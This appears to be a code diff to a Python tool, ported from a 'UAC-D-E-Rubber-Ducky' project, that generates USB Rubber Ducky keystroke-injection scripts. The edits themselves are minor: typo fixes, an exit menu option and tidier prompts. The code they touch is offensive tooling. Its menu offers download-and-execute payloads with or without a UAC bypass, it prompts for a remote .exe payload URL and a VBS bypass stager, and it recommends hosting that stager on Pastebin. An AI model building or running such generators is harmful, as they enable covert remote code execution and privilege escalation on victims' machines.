@@ -16,7 +16,7 @@
 # HTTPS://GITHUB.COM/SKIDDIETECH/UAC-D-E-RUBBER-DUCKY/BLOB/MASTER/UAC-DUCK.PY
 #
 # I HAVED USED HIS WORK AND RE-WRITTEN IT SO THAT IT CAN NOW BE RUN FOR
-# THOSE OF US WHO HAVE PYTHON 3.X.x
+# THOSE OF US WHO HAVE PYTHON 3.X.
 #
 # I WAS ABLE TO TEST CHOICES 1 AND 2 BUT WAS NOT ABLE TO TEST
 # CHOICES 3 AND 4 AS THEY REQUIRE A RUBBER DUCKY AND I NO LONGER HAVE A
@@ -47,7 +47,7 @@ def gen_bin_script(lang=None):
 
     sleep(1)
     COMMAND = "java -jar Duckencoder.jar -i DuckyScript.txt -o inject.bin"
-    if not lang == None:
+    if lang:
         system("{} -l {}".format(COMMAND, lang))
     else:
         system("{}".format(COMMAND))
@@ -68,7 +68,7 @@ def check_file_ext(f, ext):
     >>> check_file_ext('plans.txt.', '.exe')
     False
     """
-    return f.endswith(ext)
+    return f.lower().endswith(ext)
 
 def clear_pre_existing_files():
     """Removes any pre-existing files from the users directory."""
@@ -217,7 +217,7 @@ def ducky_downloader():
 def generate_script(online_version, uac_bypass, **kw):
     """generate_script(str, str, kw) -> return(None)
 
-    A thin wrap function thaworks by checking whether
+    A thin wrap function that works by checking whether
     the binary script url is either the online or
     offline version. As well as whether to implement the
     script with either a UAC bypass or not.
@@ -343,11 +343,12 @@ def menu():
 
     [3] Generate binary download & execute ducky script without UAC bypass.
     [4] Generate binary download & execute ducky script with UAC bypass.
+    [5] Exit
 
     """)
 
     while True:
-        choice = input('[+] Enter a number between (1-4) : ')
+        choice = input('[+] Enter a number between (1-5) : ')
         if choice.isdigit():
             choice = int(choice)
             if 1 <= choice <= 5:
@@ -358,7 +359,7 @@ def main():
 
     if choice == 1 or choice == 2:
         while True:
-            print('\n[+] Please enter your binary payload direct link URL(www.example.com/pay.exe):')
+            print('\n[+] Please enter your binary payload direct link URL( www.example.com/pay.exe):')
             binary_payload_url = input('[ONLINE] >>> (binary_payload_url) : ').lower()
             if check_file_ext(binary_payload_url, '.exe'):
                 break
@@ -377,20 +378,20 @@ def main():
     if choice == 2:
         generate_script(True, True, payload_url=binary_payload_url, file_name=file_name)
 
-        print("\n[+] Please upload this .vbs file as raw text format to a webserver(Pastebin works great)")
+        print("\n[+] Please UPLOAD this .vbs file as raw text format to a webserver(Pastebin works great)")
         sleep(1)
         print('[+] Pastebin/RAW recommended Example http://pastebin.com/raw/VBSPAYLOAD)')
-        print('[+] Please now enter your UAC VBS Payload URL you used for upload.')
+        print('[+] Please now enter your UAC VBS Payload URL you used for upload.\n')
+
         uac_payload_url = input("ONLINE VERSION with UAC BYPASS >>> (UAC_VBS_payload_urL) : ")
-        sleep(1)
-        print('\n[+] Enter a name to save the UAC VBS Payload file as, default name (update.vbs): ')
+        print('\n[+] Now enter a NAME to save the UAC VBS Payload file as, default name (update.vbs): ')
         name = input('[ONLINE] >>> (file_name) : ').lower()
         gen_payload_duckyscript(uac_payload_url, name) if name else gen_payload_duckyscript(uac_payload_url)
 
     elif choice == 3 or choice == 4:
 
         while True:
-            print("[+] Enter your BINARY PAYLOAD NAME located on the drive e.g update.exe: ")
+            print("[+] Enter your binary payload name located on the drive e.g/ update.exe: ")
             payload_name = input('[OFFLINE] >>> (payload_name) : ')
             if check_file_ext(payload_name, '.exe'):
                 break
@@ -413,6 +414,9 @@ def main():
             generate_script(False, True, payload_name=payload_name,
                             drive_name=drive_name, stager_name=stager_name )
 
+    elif choice == 5:
+        sys.exit('[+] Thanks, for using ducky automation good bye!!!')
+
     while True:
         ans = input('[+] Would you like to encode your DuckyScript.txt into an inject bin file ("y/n/yes/no"): ')
         if ans[0].lower() == 'y':
@@ -422,7 +426,7 @@ def main():
             ducky_encoder() # encode ducky script to inject.bin file.
             break
         elif ans[0].lower() == 'n':
-            break
+           break
 
     sys.exit('[+] Your payload has been generated. This screen will now exit bye.\n')
 
